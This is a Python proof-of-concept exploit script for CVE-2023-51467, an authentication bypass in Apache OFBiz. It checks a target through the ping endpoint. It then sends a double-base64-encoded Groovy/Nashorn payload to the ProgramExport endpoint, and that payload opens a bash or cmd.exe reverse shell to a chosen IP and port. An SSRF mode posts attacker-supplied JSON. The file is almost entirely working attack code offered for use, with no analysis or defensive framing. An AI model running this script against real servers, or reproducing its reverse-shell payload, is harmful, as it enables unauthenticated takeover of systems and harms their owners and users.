#!/usr/bin/python
import requests, argparse, base64, json
from enum import verify
from pathlib import Path
from urllib.parse import urljoin
from urllib3 import disable_warnings

class POC(object):
    def __init__(self, object):
        disable_warnings()
        self.task = object["task"]
        self.target = object["target"]
        self.ip = object["ip"]
        self.port = object["port"]
        self.session = requests.Session()
        self.json = object["json"]

    # def createSession(self):
    #     self.session = requests.Session()
    
    def check(self):
        path = "/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y"
        url = self.getEndpoint(path)
        req = self.request(url)
        if req.ok:
            if "PONG" in req.text:
                print("[+] Target is vulnerable.")
                return True
        raise Exception("[-] Target is not vulnerable")
    
    def RCE(self):
        print("[*] Running RCE exploit.")
        path = "/webtools/control/ProgramExport/?USERNAME&PASSWORD=test&requirePasswordChange=Y"
        url = self.getEndpoint(path)

        jsPayload = base64.b64encode(self.getPayload().encode("ascii")).decode("ascii")

        # Taken from https://github.com/vulncheck-oss/cve-2023-51467/blob/main/cve-2023-51467.go#L151
        nashorn = """
            import javax.script.*;

            ScriptEngineManager factory = new ScriptEngineManager();
            ScriptEngine engine = factory.getEngineByName("nashorn");
            try {
                engine.eval(new java.lang.String(java.util.Base64.decoder.decode('"""
        nashorn += jsPayload
        nashorn += """')));
            } catch (final ScriptException se) { se.printStackTrace(); }
        """
        nashorn = base64.b64encode(nashorn.encode("ascii")).decode("ascii")
        groovy = f"""x="'{nashorn}'.de";"""
        groovy += """Eval.me(new String(Eval.me("${x}codeBase64()")));"""

        payload = {
            "groovyProgram": groovy
        }
        print(payload)
        r = self.request(url, "POST", data=payload)
        if r.ok:
            print("[+] Exploit sent.")
    
    def getPayload(self):
        # Taken from https://github.com/vulncheck-oss/go-exploit/blob/main/payload/reverse.go#L88
        js = """
            var shell = "bash";
            if (java.lang.System.getProperty("os.name").indexOf("Windows") != -1) {
                shell = "cmd.exe";
            }
            var p = new java.lang.ProcessBuilder(shell).redirectErrorStream(true).start();
        """
        
        js += f"var s=new java.net.Socket('{self.ip}', {self.port});"
        
        js += """
            var socketInput = new java.io.BufferedReader(new java.io.InputStreamReader(s.getInputStream()));
            var socketOutput = new java.io.BufferedWriter(new java.io.OutputStreamWriter(s.getOutputStream()));
            var processInput = new java.io.BufferedWriter(new java.io.OutputStreamWriter(p.getOutputStream()));
            var processOutput = new java.io.BufferedReader(new java.io.InputStreamReader(p.getInputStream()));

            while (!s.isClosed()) {
                var data
                if ((data = socketInput.readLine()) != null) {
                    processInput.write(data + "\\n");
                    processInput.flush()
                }
                java.lang.Thread.sleep(50);

                while (processOutput.ready() && (data = processOutput.read()) > 0) {
                        socketOutput.write(data);
                }
                socketOutput.flush()
                try {
                    p.exitValue();
                    break;
                } catch (e) {
                }
            }

            p.destroy();
            s.close();
        """
        return js

    def SSRF(self):
        print("[*] Running SSRF exploit.")
        path = "/webtools/control/getJSONuiLabelArray/?USERNAME&PASSWORD=test&requirePasswordChange=Y"
        url = self.getEndpoint(path)
        payload = {
            # Looks hacky. Because it is. json.loads replaces double quotes with single quotes. Payload only works with double quotes from observation.
            "requiredLabels": str(json.dumps(json.loads(Path(self.json).read_bytes())))
        }
        print(payload)
        r = self.request(url, "POST", data=payload)
        if r.ok:
            print("[+] Exploit sent.")
            print(r.content)

    def getEndpoint(self, path):
        return urljoin(self.target, path)

    def request(self, url, method="GET", data=None):
        return self.session.request(url=url, method=method, data=data, verify=False)

    def run(self):
        if self.task == "RCE":
            self.RCE()
        elif self.task == "SSRF":
            self.SSRF()

def main():
    msg = "POC for CVE-2023-51467"
    tasks = ["SSRF", "RCE"]
    parser = argparse.ArgumentParser(description=msg)
    g1 = parser.add_argument_group("RCE")
    g2 = parser.add_argument_group("SSRF")
    parser.add_argument("-u", "--url", help="Target to exploit.", required=True)
    parser.add_argument("-t", "--task", choices=tasks, help="Task to carry out.", default="RCE")
    g1.add_argument("-i", "--ip", help="Reverse shell IP", default="127.0.0.1")
    g1.add_argument("-p", "--port", help="Reverse shell Port", default="4444")
    g2.add_argument("-j", "--json", help="json payload file")
    args = vars(parser.parse_args())
    
    init = {
        "target": args.get("url"),
        "task": args.get("task"),
        "ip": args.get("ip"),
        "port": args.get("port"),
        "json": None
    }
    if init["task"] == "SSRF":
        init["json"] = args.get("json")
    poc = POC(init)
    try:
        vulnerable = poc.check()
        if vulnerable:
            poc.run()
    except Exception as e:
        raise e
    finally:
        print("[*] Done.")

if __name__ == "__main__":
    exit(main())